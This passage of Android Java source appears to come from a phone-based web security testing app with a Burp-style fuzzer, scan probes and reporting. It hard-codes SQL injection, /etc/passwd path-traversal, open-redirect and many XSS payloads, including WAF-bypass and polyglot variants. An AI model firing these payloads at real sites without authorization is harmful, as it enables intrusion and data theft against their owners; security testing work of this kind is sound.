                java.util.Map<String, java.util.List<String>> headers = conn.getHeaderFields();
                if (headers != null) {
                    for (java.util.Map.Entry<String, java.util.List<String>> e : headers.entrySet()) {
                        if (e.getKey() == null || e.getValue().isEmpty()) continue;
                        String k = e.getKey().toLowerCase(java.util.Locale.ROOT);
                        if (k.equals("server")) server = e.getValue().get(0);
                        else if (k.equals("x-powered-by")) poweredBy = e.getValue().get(0);
                    }
                }
                java.io.InputStream in;
                try { in = conn.getInputStream(); } catch (Exception e) { in = conn.getErrorStream(); }
                String body = "";
                if (in != null) {
                    java.io.ByteArrayOutputStream buf = new java.io.ByteArrayOutputStream();
                    byte[] chunk = new byte[8192];
                    int read, total = 0;
                    while ((read = in.read(chunk)) != -1 && total < 256 * 1024) { buf.write(chunk, 0, read); total += read; }
                    in.close();
                    body = new String(buf.toByteArray(), java.nio.charset.StandardCharsets.UTF_8);
                }
                java.util.regex.Matcher gm = java.util.regex.Pattern.compile("<meta[^>]+name=[\"']generator[\"'][^>]+content=[\"']([^\"']+)[\"']", java.util.regex.Pattern.CASE_INSENSITIVE).matcher(body);
                if (gm.find()) generator = gm.group(1);
                String lower = body.toLowerCase(java.util.Locale.ROOT);
                if (lower.contains("wp-content") || lower.contains("wp-includes")) libs.add("WordPress");
                if (lower.contains("drupal")) libs.add("Drupal");
                if (lower.contains("joomla")) libs.add("Joomla");
                if (lower.contains("jquery")) libs.add("jQuery");
                if (lower.contains("angular")) libs.add("Angular");
                if (lower.contains("vue")) libs.add("Vue");
                if (lower.contains("react")) libs.add("React");
                if (lower.contains("bootstrap")) libs.add("Bootstrap");
                if (lower.contains("laravel")) libs.add("Laravel");
            } catch (Exception e) {
                error = e.getMessage();
            } finally {
                if (conn != null) conn.disconnect();
            }
            final String fServer = server, fPowered = poweredBy, fGen = generator, fError = error;
            final java.util.ArrayList<String> fLibs = libs;
            runOnUiThread(() -> {
                techAnalyzing = false;
                if (fError != null) techResults = "No se pudo analizar: " + fError;
                else {
                    StringBuilder out = new StringBuilder("Tecnologías detectadas en " + shortUrl(target) + ":\n");
                    out.append("• Servidor: ").append(fServer == null ? "no declarado" : fServer).append("\n");
                    out.append("• X-Powered-By: ").append(fPowered == null ? "no declarado" : fPowered).append("\n");
                    out.append("• Generador: ").append(fGen == null ? "no declarado" : fGen).append("\n");
                    out.append("• Librerías/CMS: ").append(fLibs.isEmpty() ? "ninguna detectada" : String.join(", ", fLibs));
                    techResults = out.toString();
                }
                if (activePanel.equals("RECON")) renderNow();
            });
        }).start();
    }

    private void showReportPanel() {
        addPanelText("Reporte · hallazgos", Color.rgb(105, 205, 255));
        addPanelText("Todo lo que encontraron el escaneo automático y el Intruso, en un solo lugar, listo para copiar o compartir.", Color.LTGRAY);
        int total = scanFindings.size() + intruderFindings.size();
        addPanelText("Hallazgos: " + total + "  •  del escaneo: " + scanFindings.size() + "  •  del Intruso: " + intruderFindings.size(), Color.WHITE);
        if (total == 0) addPanelText("Aún no hay hallazgos. Ejecuta el escaneo automático en OWASP o un ataque en el Intruso.", Color.LTGRAY);
        else {
            StringBuilder out = new StringBuilder();
            if (!scanFindings.isEmpty()) {
                out.append("Del escaneo:\n");
                for (String f : scanFindings) out.append("• ").append(f).append("\n");
            }
            if (!intruderFindings.isEmpty()) {
                if (out.length() > 0) out.append("\n");
                out.append("Del Intruso:\n");
                for (String f : intruderFindings) out.append("• ").append(f).append("\n");
            }
            addPanelText(out.toString(), Color.rgb(215, 220, 230));
        }
        addPanelButton("Copiar reporte", v -> {
            String text = buildReportText();
            ClipboardManager cm = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
            cm.setPrimaryClip(ClipData.newPlainText("Reporte BrowserDebug", text));
            Toast.makeText(this, "Reporte copiado", Toast.LENGTH_SHORT).show();
        });
        addPanelButton("Compartir reporte", v -> {
            Intent intent = new Intent(Intent.ACTION_SEND);
            intent.setType("text/plain");
            intent.putExtra(Intent.EXTRA_SUBJECT, "Reporte BrowserDebug");
            intent.putExtra(Intent.EXTRA_TEXT, buildReportText());
            startActivity(Intent.createChooser(intent, "Compartir reporte"));
        });
        addPanelButton("Exportar registros (consola/red)", v -> exportRecords());
        addPanelButton("Limpiar hallazgos", v -> { scanFindings.clear(); intruderFindings.clear(); renderNow(); });
    }

    private String buildReportText() {
        StringBuilder out = new StringBuilder();
        out.append("BrowserDebug · reporte de hallazgos\n");
        out.append("URL: ").append(webView.getUrl() == null ? "sin página" : webView.getUrl()).append("\n");
        out.append("Fecha: ").append(new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm", java.util.Locale.US).format(new java.util.Date())).append("\n\n");
        if (scanFindings.isEmpty() && intruderFindings.isEmpty()) out.append("Sin hallazgos.\n");
        if (!scanFindings.isEmpty()) {
            out.append("Del escaneo automático:\n");
            for (String f : scanFindings) out.append("- ").append(f).append("\n");
            out.append("\n");
        }
        if (!intruderFindings.isEmpty()) {
            out.append("Del Intruso:\n");
            for (String f : intruderFindings) out.append("- ").append(f).append("\n");
            out.append("\n");
        }
        out.append("Nota: las pruebas se hicieron desde el teléfono contra el objetivo cargado. Los hallazgos de ejecución XSS se confirmaron con alert capturado; los de reflejo o error requieren confirmación manual.");
        return out.toString();
    }

    private void showIntruderPanel() {
        addPanelText("Intruso · fuzzing estilo Burp", Color.rgb(105, 205, 255));
        addPanelText("Ataca un parámetro de la URL con una lista de payloads, uno por uno, y compara cada respuesta con la original. Marca REFLEJADO si el cuerpo devuelve el payload, y errores de base de datos o de ruta si aparecen. La ejecución de JavaScript no se ve aquí (la petición directa no tiene motor JS): se confirma en el probador de la pestaña JS o en el escaneo.", Color.LTGRAY);
        addPanelText("Parámetro a atacar", Color.WHITE);
        EditText paramInput = paramEditText(intruderParam, "q");
        paramInput.addTextChangedListener(new android.text.TextWatcher() {
            public void beforeTextChanged(CharSequence s, int st, int c, int a) { }
            public void onTextChanged(CharSequence s, int st, int before, int count) { intruderParam = s.toString(); }
            public void afterTextChanged(android.text.Editable e) { }
        });
        panelContent.addView(paramInput, new LinearLayout.LayoutParams(-1, dp(40)));
        addPanelText("Lista de payloads", Color.WHITE);
        String[] listKeys = {"xss", "sqli", "traversal", "redirect", "custom"};
        String[] listLabels = {"XSS", "SQLi", "Path traversal", "Redirección abierta", "Personalizada"};
        for (int i = 0; i < listKeys.length; i++) {
            final String key = listKeys[i];
            addPanelButton((intruderList.equals(key) ? "● " : "") + listLabels[i] + " (" + intruderPayloads(key).size() + ")", v -> { intruderList = key; renderNow(); });
        }
        if (intruderList.equals("custom")) {
            addPanelText("Un payload por línea", Color.LTGRAY);
            EditText customInput = panelEditText(intruderCustom, "payload1\npayload2", 72);
            customInput.addTextChangedListener(new android.text.TextWatcher() {
                public void beforeTextChanged(CharSequence s, int st, int c, int a) { }
                public void onTextChanged(CharSequence s, int st, int before, int count) { intruderCustom = s.toString(); }
                public void afterTextChanged(android.text.Editable e) { }
            });
        }
        addPanelText("Base: " + (repeaterMethod == null || repeaterMethod.trim().isEmpty() ? "GET" : repeaterMethod.trim()) + " " + shortUrl(intruderBaseUrl()), Color.LTGRAY);
        addPanelButton(intruderRunning ? "Detener ataque" : "Iniciar ataque", v -> { if (intruderRunning) intruderRunning = false; else runIntruder(); });
        if (intruderStatus != null) addPanelText(intruderStatus, Color.WHITE);
        if (!intruderResults.isEmpty()) {
            StringBuilder out = new StringBuilder("Resultados (base: HTTP " + intruderBaselineStatus + " · " + intruderBaselineLength + " B):\n");
            for (String[] row : intruderResults) out.append(row[0]).append("\n");
            addPanelText(out.toString(), Color.rgb(215, 220, 230));
        }
        if (!intruderFindings.isEmpty()) {
            StringBuilder out = new StringBuilder("Hallazgos del Intruso:\n");
            for (String f : intruderFindings) out.append("• ").append(f).append("\n");
            addPanelText(out.toString(), Color.rgb(215, 220, 230));
        }
    }

    private java.util.ArrayList<String> intruderPayloads(String key) {
        java.util.ArrayList<String> out = new java.util.ArrayList<>();
        if (key.equals("xss")) {
            out.addAll(xssLibraryAlertPayloads());
        } else if (key.equals("sqli")) {
            out.add("'");
            out.add("\"");
            out.add("' OR '1'='1");
            out.add("\" OR \"1\"=\"1");
            out.add("1' OR '1'='1");
            out.add("' OR 1=1--");
            out.add("1; SELECT 1");
            out.add("' UNION SELECT 1,2,3--");
            out.add("admin'--");
            out.add("1' AND '1'='2");
        } else if (key.equals("traversal")) {
            out.add("../");
            out.add("../../");
            out.add("../../../etc/passwd");
            out.add("..%2f..%2f..%2fetc%2fpasswd");
            out.add("....//....//etc/passwd");
            out.add("/etc/passwd");
            out.add("..\\..\\windows\\win.ini");
        } else if (key.equals("redirect")) {
            out.add("https://example.com");
            out.add("//example.com");
            out.add("https://evil.example.com");
            out.add("http://127.0.0.1");
            out.add("/\\example.com");
        } else if (key.equals("custom")) {
            for (String line : intruderCustom.split("\n")) {
                String t = line.trim();
                if (!t.isEmpty()) out.add(t);
            }
        }
        return out;
    }

    private String intruderBaseUrl() {
        String base = repeaterUrl == null ? "" : repeaterUrl.trim();
        if (base.isEmpty() && webView.getUrl() != null) base = webView.getUrl();
        if (!base.matches("^[a-zA-Z][a-zA-Z0-9+.-]*://.*")) base = "https://" + base;
        return base;
    }

    private String intruderRequestUrl(String baseUrl, String param, String payload) {
        int q = baseUrl.indexOf('?');
        String base = q >= 0 ? baseUrl.substring(0, q) : baseUrl;
        java.util.LinkedHashMap<String, String> params = new java.util.LinkedHashMap<>();
        if (q >= 0) {
            String query = baseUrl.substring(q + 1);
            int h = query.indexOf('#');
            if (h >= 0) query = query.substring(0, h);
            for (String pair : query.split("&")) {
                if (pair.isEmpty()) continue;
                int eq = pair.indexOf('=');
                try {
                    params.put(eq >= 0 ? java.net.URLDecoder.decode(pair.substring(0, eq), "UTF-8") : pair, eq >= 0 ? java.net.URLDecoder.decode(pair.substring(eq + 1), "UTF-8") : "");
                } catch (Exception ignored) { }
            }
        }
        for (String[] p : repeaterParams) params.put(p[0], p[1] == null ? "" : p[1]);
        if (payload != null) params.put(param, payload);
        StringBuilder out = new StringBuilder(base);
        boolean first = true;
        for (java.util.Map.Entry<String, String> e : params.entrySet()) {
            try {
                out.append(first ? '?' : '&');
                first = false;
                out.append(java.net.URLEncoder.encode(e.getKey(), "UTF-8")).append('=').append(java.net.URLEncoder.encode(e.getValue(), "UTF-8"));
            } catch (Exception ignored) { }
        }
        return out.toString();
    }

    private int[] intruderSend(String baseUrl, String param, String payload) {
        long start = System.currentTimeMillis();
        int code = -1;
        int length = 0;
        String body = "";
        java.net.HttpURLConnection conn = null;
        try {
            String url = payload == null ? buildRepeaterUrl(baseUrl) : intruderRequestUrl(baseUrl, param, payload);
            String method = repeaterMethod == null || repeaterMethod.trim().isEmpty() ? "GET" : repeaterMethod.trim().toUpperCase(java.util.Locale.ROOT);
            conn = (java.net.HttpURLConnection) new java.net.URL(url).openConnection();
            conn.setConnectTimeout(8000);
            conn.setReadTimeout(15000);
            conn.setRequestMethod(method);
            conn.setInstanceFollowRedirects(true);
            java.util.LinkedHashMap<String, String> headers = new java.util.LinkedHashMap<>();
            for (String line : (repeaterHeaders == null ? "" : repeaterHeaders).split("\n")) {
                int colon = line.indexOf(':');
                if (colon > 0) headers.put(line.substring(0, colon).trim(), line.substring(colon + 1).trim());
            }
            if (!hasHeader(headers, "User-Agent")) headers.put("User-Agent", webView.getSettings().getUserAgentString());
            if (!hasHeader(headers, "Cookie")) {
                String cookies = android.webkit.CookieManager.getInstance().getCookie(url);
                if (cookies != null && !cookies.isEmpty()) headers.put("Cookie", cookies);
            }
            byte[] bodyBytes = (repeaterBody == null ? "" : repeaterBody).getBytes(java.nio.charset.StandardCharsets.UTF_8);
            boolean hasBody = bodyBytes.length > 0 && (method.equals("POST") || method.equals("PUT") || method.equals("PATCH") || method.equals("DELETE"));
            if (hasBody) {
                if (!hasHeader(headers, "Content-Type")) headers.put("Content-Type", "application/x-www-form-urlencoded");
                conn.setDoOutput(true);
            }
            for (java.util.Map.Entry<String, String> e : headers.entrySet()) conn.setRequestProperty(e.getKey(), e.getValue());
            if (hasBody) {
                conn.setFixedLengthStreamingMode(bodyBytes.length);
                java.io.OutputStream out = conn.getOutputStream();
                out.write(bodyBytes);
                out.close();
            }
            code = conn.getResponseCode();
            java.io.InputStream in;
            try { in = conn.getInputStream(); } catch (Exception e) { in = conn.getErrorStream(); }
            if (in != null) {
                java.io.ByteArrayOutputStream buf = new java.io.ByteArrayOutputStream();
                byte[] chunk = new byte[8192];
                int read, total = 0;
                while ((read = in.read(chunk)) != -1 && total < 64 * 1024) { buf.write(chunk, 0, read); total += read; }
                in.close();
                byte[] raw = buf.toByteArray();
                length = raw.length;
                body = new String(raw, java.nio.charset.StandardCharsets.UTF_8);
            }
        } catch (Exception ignored) { } finally { if (conn != null) conn.disconnect(); }
        intruderLastBody = body;
        return new int[]{code, length, (int) (System.currentTimeMillis() - start)};
    }

    private String shortPayload(String p) {
        if (p == null) return "";
        return p.length() > 40 ? p.substring(0, 40) + "…" : p;
    }

    private static final String[] SQL_ERROR_SIGNS = {"you have an error in your sql syntax", "warning: mysql", "mysql_fetch", "ora-01756", "unclosed quotation mark", "supplied argument is not a valid mysql", "microsoft ole db provider", "sqlstate[", "pg_query", "sqlite3"};

    private boolean containsSqlError(String lowerBody) {
        for (String s : SQL_ERROR_SIGNS) if (lowerBody.contains(s)) return true;
        return false;
    }

    private void runIntruder() {
        String param = intruderParam == null ? "" : intruderParam.trim();
        if (param.isEmpty()) {
            if (!repeaterParams.isEmpty()) param = repeaterParams.get(0)[0];
            else { Toast.makeText(this, "Escribe el parámetro a atacar", Toast.LENGTH_SHORT).show(); return; }
        }
        final String targetParam = param;
        java.util.ArrayList<String> payloads = intruderPayloads(intruderList);
        if (payloads.isEmpty()) { Toast.makeText(this, "La lista de payloads está vacía", Toast.LENGTH_SHORT).show(); return; }
        if (payloads.size() > 100) payloads = new java.util.ArrayList<>(payloads.subList(0, 100));
        intruderRunning = true;
        intruderResults.clear();
        intruderFindings.clear();
        intruderBaselineStatus = -1;
        intruderBaselineLength = -1;
        intruderStatus = "Atacando «" + targetParam + "» con " + payloads.size() + " payloads…";
        renderNow();
        final java.util.ArrayList<String> fPayloads = payloads;
        new Thread(() -> {
            String base = intruderBaseUrl();
            int[] baseRes = intruderSend(base, targetParam, null);
            intruderBaselineStatus = baseRes[0];
            intruderBaselineLength = baseRes[1];
            runOnUiThread(() -> { if (activePanel.equals("REPETIDOR")) renderNow(); });
            for (int i = 0; i < fPayloads.size() && intruderRunning; i++) {
                String payload = fPayloads.get(i);
                int[] res = intruderSend(base, targetParam, payload);
                String body = intruderLastBody == null ? "" : intruderLastBody;
                String lower = body.toLowerCase(java.util.Locale.ROOT);
                java.util.ArrayList<String> flags = new java.util.ArrayList<>();
                if (body.contains(payload) || body.contains(Uri.encode(payload))) flags.add("REFLEJADO");
                if (containsSqlError(lower)) flags.add("ERROR SQL");
                if (lower.contains("root:") && lower.contains("/bin/bash")) flags.add("TRAVERSAL");
                if (res[0] != intruderBaselineStatus || res[1] != intruderBaselineLength) flags.add("≠ base");
                final String row = (i + 1) + ". " + (flags.isEmpty() ? "" : ("[" + String.join(" ", flags) + "] ")) + shortPayload(payload) + " → HTTP " + res[0] + " · " + res[1] + " B · " + res[2] + " ms";
                final int fi = i;
                runOnUiThread(() -> {
                    intruderResults.add(new String[]{row});
                    intruderStatus = "Atacando " + (fi + 1) + "/" + fPayloads.size() + "…";
                    if (activePanel.equals("REPETIDOR")) renderNow();
                });
                if (flags.contains("REFLEJADO") || flags.contains("ERROR SQL") || flags.contains("TRAVERSAL")) {
                    final String finding = "[ALTO] Intruso: el parámetro «" + targetParam + "» " + (flags.contains("REFLEJADO") ? "refleja el payload" : flags.contains("ERROR SQL") ? "devuelve error de base de datos" : "devuelve contenido de ruta") + " con «" + shortPayload(payload) + "»";
                    runOnUiThread(() -> intruderFindings.add(finding));
                }
                try { Thread.sleep(300); } catch (InterruptedException ignored) { }
            }
            intruderRunning = false;
            runOnUiThread(() -> {
                intruderStatus = "Ataque terminado: " + intruderResults.size() + " peticiones, " + intruderFindings.size() + " hallazgos.";
                if (activePanel.equals("REPETIDOR")) renderNow();
            });
        }).start();
    }

    private void runScanProbes(String kind) {
        new Thread(() -> {
            java.util.ArrayList<String> targets = new java.util.ArrayList<>();
            for (String p : coverageGetParams) targets.add("get:" + p);
            for (String f : coverageFormFields) {
                String[] parts = f.split("\\|", -1);
                if (parts.length >= 3 && "POST".equals(parts[2])) targets.add("post:" + parts[0] + ":" + parts[1]);
            }
            java.util.ArrayList<String> found = new java.util.ArrayList<>();
            int tested = 0;
            for (String target : targets) {
                if (tested >= 2) break;
                tested++;
                if (kind.equals("sqli")) {
                    String r1 = probeOnce(target, "'", "sqli");
                    if (r1 != null) found.add(r1);
                    String r2 = probeOnce(target, "' OR '1'='1", "sqli");
                    if (r2 != null) found.add(r2);
                } else if (kind.equals("traversal")) {
                    String r = probeOnce(target, "../../../../etc/passwd", "traversal");
                    if (r != null) found.add(r);
                } else if (kind.equals("redirect")) {
                    String r = probeOnce(target, "https://example.com", "redirect");
                    if (r != null) found.add(r);
                }
                try { Thread.sleep(300); } catch (InterruptedException ignored) { }
            }
            final java.util.ArrayList<String> fFound = found;
            runOnUiThread(() -> {
                for (String f : fFound) addScanFinding(f);
                if (scanRunning) advanceScanForStep(scanCurrentId);
            });
        }).start();
    }

    private String probeOnce(String target, String payload, String kind) {
        String url = webView.getUrl();
        if (url == null) return null;
        try {
            String method = "GET";
            String reqUrl = url;
            byte[] bodyBytes = new byte[0];
            if (target.startsWith("get:")) {
                String name = target.substring(4);
                reqUrl = Uri.parse(url).buildUpon().appendQueryParameter(name, payload).build().toString();
            } else if (target.startsWith("post:")) {
                String[] parts = target.split(":", 3);
                method = "POST";
                String field = parts.length >= 3 ? parts[2] : "q";
                String bodyStr = java.net.URLEncoder.encode(field, "UTF-8") + "=" + java.net.URLEncoder.encode(payload, "UTF-8");
                bodyBytes = bodyStr.getBytes(java.nio.charset.StandardCharsets.UTF_8);
            } else return null;
            java.net.HttpURLConnection conn = (java.net.HttpURLConnection) new java.net.URL(reqUrl).openConnection();
            conn.setConnectTimeout(8000);
            conn.setReadTimeout(10000);
            conn.setRequestMethod(method);
            conn.setRequestProperty("User-Agent", webView.getSettings().getUserAgentString());
            if (kind.equals("redirect")) conn.setInstanceFollowRedirects(false);
            else conn.setInstanceFollowRedirects(true);
            if (bodyBytes.length > 0) {
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                conn.setFixedLengthStreamingMode(bodyBytes.length);
                java.io.OutputStream out = conn.getOutputStream();
                out.write(bodyBytes);
                out.close();
            }
            int code = conn.getResponseCode();
            String location = conn.getHeaderField("Location");
            java.io.InputStream in;
            try { in = conn.getInputStream(); } catch (Exception e) { in = conn.getErrorStream(); }
            String body = "";
            if (in != null) {
                java.io.ByteArrayOutputStream buf = new java.io.ByteArrayOutputStream();
                byte[] chunk = new byte[8192];
                int read, total = 0;
                while ((read = in.read(chunk)) != -1 && total < 64 * 1024) { buf.write(chunk, 0, read); total += read; }
                in.close();
                body = new String(buf.toByteArray(), java.nio.charset.StandardCharsets.UTF_8);
            }
            conn.disconnect();
            String lower = body.toLowerCase(java.util.Locale.ROOT);
            if (kind.equals("sqli") && containsSqlError(lower)) {
                return "[ALTO] Posible SQLi en " + target + " con «" + shortPayload(payload) + "» (error de base de datos en la respuesta)";
            } else if (kind.equals("traversal") && lower.contains("root:") && lower.contains("/bin/bash")) {
                return "[ALTO] Posible path traversal en " + target + " (contenido de /etc/passwd en la respuesta)";
            } else if (kind.equals("redirect") && (code == 301 || code == 302 || code == 303 || code == 307 || code == 308) && location != null && location.contains("example.com")) {
                return "[ALTO] Posible redirección abierta en " + target + " (redirige a example.com)";
            }
            return null;
        } catch (Exception ignored) {
            return null;
        }
    }

    // Biblioteca de payloads XSS (v3.0), curada de tres repositorios
    // públicos: theWeborion/xss-bypass-techniques (sin licencia declarada),
    // pgaijin66/XSS-Payloads (GPL-3.0) y hakluke/weaponised-XSS-payloads
    // (sin licencia declarada). Cada fila: {categoría, etiqueta, payload}.
    // Etiqueta vacía = dispara alert al ejecutarse; "clic"/"ratón"/"tecla"
    // = necesita interacción; "exfiltración..." = no dispara alert, solo
    // sirve con un servidor de escucha propio (https://TU-SERVIDOR/).
    private static final String[][] XSS_LIBRARY = {
        {"Eventos poco comunes", "", "<video src=x onerror=alert(document.domain)>"},
        {"Eventos poco comunes", "", "<audio src=x onerror=alert(document.domain)>"},
        {"Eventos poco comunes", "", "<body onload=alert(document.domain)>"},
        {"Eventos poco comunes", "", "<input onfocus=alert(document.domain) autofocus>"},
        {"Eventos poco comunes", "", "<input onblur=alert(document.domain) autofocus><input autofocus>"},
        {"Eventos poco comunes", "", "<select autofocus onfocus=alert(document.domain)>"},
        {"Eventos poco comunes", "", "<textarea autofocus onfocus=alert(document.domain)>"},
        {"Eventos poco comunes", "", "<input type=\"date\" autofocus onfocus=alert(document.domain)>"},
        {"Eventos poco comunes", "", "<marquee onstart=alert(document.domain)>"},
        {"Eventos poco comunes", "", "<frameset onload=alert(document.domain)>"},
        {"Eventos poco comunes", "", "<iframe onload=alert(document.domain)>"},
        {"Eventos poco comunes", "", "<img src=\"xx:xx\" onerror=alert(document.domain)>"},
        {"Eventos poco comunes", "", "<img src=x onerror=\"this.onerror=alert(document.domain)\">"},
        {"Eventos poco comunes", "", "<img src=\"x:alert(document.domain)\" onerror=\"eval(src)\">"},
        {"Eventos poco comunes", "", "<script>+-1-+-+alert(document.domain)</script>"},
        {"Eventos poco comunes", "tecla", "<textarea onkeyup=\"alert(document.domain)\">"},
        {"Eventos poco comunes", "ratón", "<div onmouseover=alert(document.domain)>x</div>"},
        {"Bypass de WAF", "", "JaVaScRiPt:alert(document.domain)"},
        {"Bypass de WAF", "", "java&Tab;script:alert(document.domain)"},
        {"Bypass de WAF", "", "jav&#x09;ascript:alert(document.domain)"},
        {"Bypass de WAF", "", "jav&#x0A;ascript:alert(document.domain)"},
        {"Bypass de WAF", "", "jav&#x0D;ascript:alert(document.domain)"},
        {"Bypass de WAF", "", "java&#x73;cript:alert(document.domain)"},
        {"Bypass de WAF", "", "&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(document.domain)"},
        {"Bypass de WAF", "", "javascript&colon;alert(document.domain)"},
        {"Bypass de WAF", "", "javascript&#x3A;alert(document.domain)"},
        {"Bypass de WAF", "", "javascript&#58;alert(document.domain)"},
        {"Bypass de WAF", "", "javascript://%0Aalert(document.domain)"},
        {"Bypass de WAF", "", "javascript://%0Dalert(document.domain)"},
        {"Bypass de WAF", "", "javascript:alert%60%60"},
        {"Bypass de WAF", "", "javascript:%61%6c%65%72%74%28%64%6f%63%75%6d%65%6e%74%2e%64%6f%6d%61%69%6e%29"},
        {"Bypass de WAF", "", "javascript:alert&lpar;document.domain&rpar;"},
        {"Bypass de WAF", "", "JaVaScRiPt&#58;alert(document.domain)"},
        {"Bypass de WAF", "", "<ScRiPt>alert(document.domain)</ScRiPt>"},
        {"Bypass de WAF", "", "<script >alert(document.domain)</script>"},
        {"Bypass de WAF", "", "<script /*%00*/>/*%00*/alert(document.domain)/*%00*/</script /*%00*/"},
        {"Bypass de WAF", "", "<scr<script>ipt>alert(document.domain)</scr</script>ipt>"},
        {"Bypass de WAF", "", "<IMG SRC=javascript:alert(document.domain)>"},
        {"Bypass de WAF", "", "<img src=\"javascript:alert(document.domain)\">"},
        {"Bypass de WAF", "", "<img src=javascript:alert(document.domain)>"},
        {"Bypass de WAF", "", "<img src=JaVaScRiPt:alert(document.domain)>"},
        {"Bypass de WAF", "", "<img src=\" &#14;  javascript:alert(document.domain);\">"},
        {"Bypass de WAF", "", "<img src=javascrscriptipt:alert(document.domain)>"},
        {"Bypass de WAF", "", "<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>"},
        {"Bypass de WAF", "", "<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>"},
        {"Bypass de WAF", "", "%253cscript%253ealert(document.domain)%253c/script%253e"},
        {"Bypass de WAF", "", "+ADw-script+AD4-alert(document.domain)+ADw-/script+AD4-"},
        {"Bypass de WAF", "", "<script>a=/XSS/alert(a.source)</script>"},
        {"Bypass de WAF", "", "\\\\\";alert(document.domain);//"},
        {"Bypass de WAF", "", "';alert(String.fromCharCode(88,83,83))//"},
        {"Bypass de WAF", "", "<script>alert(String.fromCharCode(88,83,83))</script>"},
        {"Bypass de WAF", "ratón", "&#34;&#62;<h1 onmouseover='\\u0061lert(document.domain)'>"},
        {"Bypass de WAF", "", "<iframe %00 src=\"&Tab;javascript:alert(document.domain)&Tab;\"%00>"},
        {"Bypass de WAF", "", "with(document)alert(cookie)"},
        {"Sin etiquetas", "clic", "<a href=\"javascript:alert(document.domain)\">x</a>"},
        {"Sin etiquetas", "clic", "<a href=\"jAvAsCrIpT:alert(document.domain)\">x</a>"},
        {"Sin etiquetas", "clic", "<a href=\"javascript&#58;alert(document.domain)\">x</a>"},
        {"Sin etiquetas", "clic", "<a href=\"data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+\">x</a>"},
        {"Sin etiquetas", "clic", "<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">x</a>"},
        {"Sin etiquetas", "clic", "<form><button formaction=\"javascript:alert(document.domain)\">x</button></form>"},
        {"Sin etiquetas", "clic", "<form action=\"javascript:alert(document.domain)\"><input type=\"submit\"></form>"},
        {"Sin etiquetas", "", "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(document.domain)\">"},
        {"Sin etiquetas", "", "<meta content=\"&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(document.domain)\" http-equiv=\"refresh\">"},
        {"Sin etiquetas", "", "<meta http-equiv=\"refresh\" content=\"0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">"},
        {"Sin etiquetas", "", "<iframe src=\"javascript:alert(document.domain)\">"},
        {"Sin etiquetas", "", "<iframe src=javascript:alert(document.domain)>"},
        {"Sin etiquetas", "", "<iframe src=\"data:text/html;base64,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==\">"},
        {"Sin etiquetas", "", "<script src=\"data:text/javascript,alert(document.domain)\"></script>"},
        {"Sin etiquetas", "", "<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>"},
        {"SVG y mXSS", "", "<svg><script>alert(document.domain)</script></svg>"},
        {"SVG y mXSS", "", "<svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert(document.domain)</script></svg>"},
        {"SVG y mXSS", "", "<svg><script xlink:href=\"data:text/javascript,alert(document.domain)\"></script></svg>"},
        {"SVG y mXSS", "", "<svg><script>//&NewLine;alert(document.domain);</script></svg>"},
        {"SVG y mXSS", "", "<svg><style>{font-family:'<iframe onload=alert(document.domain)>'}</style></svg>"},
        {"SVG y mXSS", "clic", "<math><mi//xlink:href=\"data:x,<script>alert(document.domain)</script>\">"},
        {"SVG y mXSS", "", "<iframe src=\"data:text/html,<svg onload=alert(document.domain)>\">"},
        {"SVG y mXSS", "", "<object data=\"data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+\"></object>"},
        {"SVG y mXSS", "", "<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert(document.domain)</script></svg>"},
        {"SVG y mXSS", "", "<iframe srcdoc=\"<svg onload=alert(document.domain)>\">"},
        {"Polyglots", "", "\";alert(String.fromCharCode(88,83,83))//\\\";alert(String.fromCharCode(88,83,83))//\\\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>"},
        {"Polyglots", "", "<\"';alert(String.fromCharCode(88,83,83))//\\';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\\\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>"},
        {"Polyglots", "", "<!--<img src=\"--><img src=x onerror=alert(document.domain)//\">"},
        {"Polyglots", "", "<![><img src=\"]><img src=x onerror=alert(document.domain)//\">"},
        {"Polyglots", "", "<? foo=\"><script>alert(document.domain)</script>\">"},
        {"Polyglots", "", "<! foo=\"><script>alert(document.domain)</script>\">"},
        {"Polyglots", "", "</ foo=\"><script>alert(document.domain)</script>\">"},
        {"Polyglots", "", "<% foo><x foo=\"%><script>alert(document.domain)</script>\">"},
        {"Polyglots", "", "<? foo=\"><x foo='?><script>alert(document.domain)</script>'>\">"},
        {"Polyglots", "", "<! foo=\"[[[Inception]]]\"><x foo=\"]foo><script>alert(document.domain)</script>\">"},
        {"Polyglots", "", "<style><img src=\"</style><img src=x onerror=alert(document.domain)//\">"},
        {"Polyglots", "", "</title><img src=x onerror=alert(document.domain)>"},
        {"Polyglots", "", "\"><img src=x onerror=alert(document.domain)>"},
        {"Polyglots", "", "<script x>alert(document.domain)</script 1=2>"},
        {"Polyglots", "", "<script ~~~>alert(document.domain)</script ~~~>"},
        {"Polyglots", "", "<script ^__^>alert(String.fromCharCode(49))</script ^__^>"},
